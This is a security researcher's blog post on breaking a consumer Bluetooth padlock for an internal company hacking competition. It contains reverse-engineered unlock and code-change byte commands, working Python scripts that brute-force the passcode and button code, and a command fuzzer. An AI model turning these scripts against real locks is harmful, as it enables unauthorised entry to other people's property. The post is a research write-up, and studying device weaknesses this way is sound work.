+    <h1 class="post-title p-name" itemprop="name headline">Sonew Bluetooth Lock-Scripts and &quot;Internal F-Secure Pwn2Own&quot;</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-12-31T10:00:00-05:00" itemprop="datePublished">Dec 31, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>In March 2020 (literally a week before the world shut down the first time), F-Secure held an “Internal F-Secure Pwn2Own” where each office competed to hack as many in-scope devices as possible. I volunteered to hack the Sonew Bluetooth Lock, aka this bastard:</p>
+
+<p><img src="/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image1.png" alt="yay" /></p>
+
+<p>The competition took place in the UK, and I was allowed 3 attempts within 15 minutes to unlock the lock via Bluetooth or physical entry without breaking the lock. I opted to attack the lock via Bluetooth.</p>
+
+<h2 id="attack-surface">Attack Surface</h2>
+
+<p>Inside the lock:</p>
+
+<p><img src="/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image2.png" alt="yay" /></p>
+
+<p><img src="/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image3.png" alt="yay" /></p>
+
+<p>Some features of the lock:</p>
+
+<ul>
+  <li>Communicated over Bluetooth with a physical 4 directional button unlock option</li>
+  <li>If you use Bluetooth, you need to know the lock’s 6 digit passcode</li>
+  <li>The phone can store this passcode for easy access</li>
+</ul>
+
+<p>The Android app contained some information about how to communicate with the lock via Bluetooth. After some reverse engineering, the following commands were discovered.</p>
+
+<h1 id="unlock-the-lock">Unlock the lock</h1>
+
+<p>The bytes below can be used to unlock the lock. Bytes 1-4 were O P E N in HEX:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD
+</code></pre></div></div>
+
+<h1 id="lock-the-lock">Lock the lock</h1>
+
+<p>THe bytes below can be used to lock the lock. Bytes 1-5 were C L O S E in HEX:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xFE, 0x43, 0x4C, 0x4F, 0x53, 0x45, 0x00, 0x00, 0x00, 0xFD
+</code></pre></div></div>
+
+<h1 id="send-passcode">Send passcode</h1>
+
+<p>The bytes below can be used to send the lock passcode. Bytes 1-6 were characters 0x00 through 0x09 to represent 1-9:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x29, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x28
+</code></pre></div></div>
+
+<p>If the passcode was correct, the lock would respond with the following bytes:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x59 0xf0 0x00 0x95
+</code></pre></div></div>
+
+<h1 id="change-passcode">Change passcode</h1>
+
+<p>The bytes below can be used to change the lock passcode. Bytes 1-6 were the old passcode, bytes 7-12 were the new passcode:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x28 0x00 0x00 0x00 0x01 0x02 0x03 0x09 0x09 0x09 0x09 0x09 0x09 0x29
+</code></pre></div></div>
+
+<p>If the old passcode was correct, the lock would respond with the following bytes:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x58 0xf0 0x00 0x95
+</code></pre></div></div>
+
+<h1 id="change-4-directional-button-code">Change 4 directional button code</h1>
+
+<p>The following bytes can be used to change the 4 directional button code. Bytes 1-6 were the old code, bytes 7-12 were the new code, characters 0x01-0x04 were used to represent up/down/left/right respectively:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xff 0x01 0x02 0x01 0x02 0x01 0x02 0x03 0x04 0x03 0x04 0x03 0x04 0xfe
+</code></pre></div></div>
+
+<p>If the old button code was correct, the lock would respond with the following bytes:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x60 0xf0 0x00 0x95
+</code></pre></div></div>
+
+<h2 id="brute-force-option">Brute Force Option</h2>
+
+<p>The lock did not have any form of lock out functionality, making brute forcing the lock code a viable attack path. My immidate thought was “This is a great idea!” followed by “No wait this is a stupid idea. Oh well lets make a PoC and see what happens”. So the first script was created:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def guess_password_method(i):
+    password_code = bytearray([0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28])
+    open_code = bytearray([0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD])
+    if len(str(i)) &lt; 6:
+        padding = "0" * (6 - (int(len(str(i)))))
+        padding += str(i)
+    code = padding[:0] + '0' + padding[0:1] + '0' + padding[1:2] + '0' + padding[2:3] + '0' + padding[3:4] + '0' + padding[4:5] + '0' + padding[5:6]
+    temp_code = bytearray.fromhex(code)
+    i2 = 0
+    while i2 != 6:
+        password_code[i2+1] = temp_code[i2]
+        i2 = i2 + 1
+    #if i % 100 == 0:
+    #    print('sending 0xff 0x00 0xff')
+    #    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", bytearray([0xFF, 0x00, 0xFF]))
+    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", password_code)
+    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", open_code)
+    yay = padding + " " + code
+    return yay
+
+
+def handle_data(handle, value):
+    response = hexlify(value)
+    if "59f00095" in str(response):
+        print("Received 'guess password success' repsonse (%s)" % str(response))
+</code></pre></div></div>
+
+<p>As you can probably guess, while this worked, the amount of time to brute force the passcode was obsurd…like over 24 hours to brute force the lock. Obviously does not qualify as a valid entry. But what happens if we instead brute force the 4 directional button code:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def change_physical_method(i):
+    # ff xx xx xx xx xx xx yy yy yy yy yy yy fe
+    physical_code = bytearray([0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x04, 0x03, 0x04, 0x03, 0x04, 0xfe]) # changed to "changed physical code"
+    if len(str(i)) &lt; 6:
+        padding = "0" * (6 - (int(len(str(i)))))
+        padding += str(i)
+    else :
+        padding = str(i)
+    code = padding[:0] + '0' + padding[0:1] + '0' + padding[1:2] + '0' + padding[2:3] + '0' + padding[3:4] + '0' + padding[4:5] + '0' + padding[5:6]
+    temp_code = bytearray.fromhex(code)
+    i2 = 0
+    while i2 != 6:
+        if temp_code[i2] == 0:
+            return
+        if temp_code[i2] &gt; 4:
+            return
+        physical_code[i2+1] = temp_code[i2]
+        i2 = i2 + 1
+    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", physical_code, wait_for_response=False)
+    print(padding + " " + code)
+
+def handle_data(handle, value):
+    response = hexlify(value)
+    # 60 f0 00 95
+    if "60f00095" in str(response):
+        print("Received repsonse (%s)" % str(response))
+</code></pre></div></div>
+
+<p>This method took a maximum of 4 minutes. Much better and easily within the alloted time for the competition.</p>
+
+<h2 id="hidden-command">Hidden Command</h2>
+
+<p>At this point the competition was still like 2 months away, so I decided to do something even more stupid: try to brute force any hidden commands in the lock. What I noticed during this research is that the lock always responded with <em>something</em> if you send it a valid command over Bluetooth. And based on what was enumerated so far, a “valid command” looks like the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xXX - beginning byte
+    |__0xYY 0xYY 0xYY 0xYY - some data
+                         |__0xZZ - end byte
+</code></pre></div></div>
+
+<p>For example, sending the real OPEN command <code class="language-plaintext highlighter-rouge">0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD</code> would result in the lock responding with some bytes, but sending a different payload, such as <code class="language-plaintext highlighter-rouge">0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFE</code> would result in the lock not sending any data back.</p>
+
+<p>Additionally, the middle data must be the correct length. For example, sending <code class="language-plaintext highlighter-rouge">0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD</code> is a valid command, but sending <code class="language-plaintext highlighter-rouge">0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0xFD</code> is not a valid command.</p>
+
+<p>The lock also stopped all communications if the payload was over 20 bytes. So in theory, a valid payload would look like:</p>
+
+<ul>
+  <li>1 byte at the beginning</li>
+  <li>Anywhere between 1 and 18 bytes for the middle data</li>
+  <li>1 byte at the end</li>
+</ul>
+
+<p>So lets make a script which will attempt to find additional commands within the above parameters:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pygatt
+from binascii import hexlify
+import sys
+import math
+from concurrent import futures
+import random
+import time
+
+adapter = pygatt.backends.GATTToolBackend('hci0')
+
+def handle_data(handle, value):
+    response = hexlify(value)
+    print("Received repsonse (%s)" % str(response))
+
+def decimal_to_hexadecimal(dec): 
+    decimal = int(dec) 
+    return hex(decimal)
+
+def fuzz_function(payload1, payload2, paddingCounter):
+  #create temp code
+  temp_code_length = paddingCounter + 2
+  temp_code_array = bytearray(temp_code_length)
+  #create byte array payload
+  temp_code_array[0] = payload1
+  temp_code_array[temp_code_length - 1] = payload2
+  #temp_code_array[temp_code_length]
+  print("Payload1: %s, PaddingCounter: %s, Payload2: %s" % (payload1, paddingCounter, payload2))
+  device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", temp_code_array)
+
+adapter.start()
+device = adapter.connect('28:EC:9A:09:C7:2B')
+
+device.subscribe("0000ffd4-0000-1000-8000-00805f9b34fb",callback=handle_data, wait_for_response=False)
+device.subscribe("0000ffdf-0000-1000-8000-00805f9b34fb", indication=False, wait_for_response=True)
+
+payload1 = 0
+paddingCounter = 1
+
+# modify payload 2
+payload2 = 0
+
+while payload2 != 256:
+  while paddingCounter != 19:
+    fuzz_function(payload1, payload2, paddingCounter)
+    paddingCounter = paddingCounter + 1
+  paddingCounter = 1
+  payload2 = payload2 + 1
+
+adapter.stop()
+</code></pre></div></div>
+
+<p>This script was used against 2 different locks at the same time, and I went through like 10 batteries. It took 2 months to completely fuzz all possible commands, and that includes the amount of times the locks randomly decided to just disconnect.</p>
+
+<p>Thankfully some hidden commands were found:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">0xC9 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0x9C</code></li>
+  <li><code class="language-plaintext highlighter-rouge">0xEF 0xXX 0xXX 0xXX 0xXX 0xF1</code></li>
+  <li><code class="language-plaintext highlighter-rouge">0xFD 0xXX 0xXX 0xXX 0xXX 0xFC</code></li>
+</ul>
+
+<p>I have no idea what the last two commands do, but I did figure out what the first command does: send physical code. So we now have another viable entry for the competition:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def guess_physical_method(i):
+    physical_code = bytearray([0xc9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c]) # changed to "send physical code"
+    if len(str(i)) &lt; 6:
+        padding = "0" * (6 - (int(len(str(i)))))
+        padding += str(i)
+    else :
+        padding = str(i)
+    code = padding[:0] + '0' + padding[0:1] + '0' + padding[1:2] + '0' + padding[2:3] + '0' + padding[3:4] + '0' + padding[4:5] + '0' + padding[5:6]
+    temp_code = bytearray.fromhex(code)
+    i2 = 0
+    while i2 != 6:
+        if temp_code[i2] == 0:
+            return
+        if temp_code[i2] &gt; 4:
+            return
+        physical_code[i2+1] = temp_code[i2]
+        i2 = i2 + 1
+    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", physical_code, wait_for_response=False)
+    print(padding + " " + code)
+
+def handle_data(handle, value):
+    response = hexlify(value)
+    if "e0f0000e" in str(response):
+        print("Received repsonse (%s)" % str(response))
+</code></pre></div></div>
+
+<h2 id="the-competition">The Competition</h2>
+
+<p>After I had finished brute forcing all of the commands, I still had some time before the competition. So I wanted to do something fun…such as programming a robot to brute force the lock for me:</p>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/lznGZaM2G6M" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
+
+<p><img src="/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image6.jpg" alt="yay" /></p>
+
+<p>Unfortunatley the competition layout was a giant counter, and having my little bot wonder around the counter with all the gadgets wasn’t the best idea. So it just stood there while it hacked for me:</p>
+
+<p><img src="/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image4.png" alt="yay" /></p>
+
+<p><img src="/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image5.png" alt="yay" /></p>
+
+<h2 id="disclosure-and-files">Disclosure and Files</h2>
+
+<p>There was none lol. One week after the competition, the world went into lockdown and our office became more focused on trying to adjust to remote working.</p>
+
+<p>Files for this research are here: <a href="https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/">https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/</a></p>
+
+  </div><a class="u-url" href="/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">YayWebsiteYay (I suck at titles)</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">YayWebsiteYay (I suck at titles)</li><li><a class="u-email" href="mailto:yogehi@gmail.com">yogehi@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">yogehi</span></a></li><li><a href="https://www.twitter.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">yogehi</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Sometimes I want to publish stuff unfiltered.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
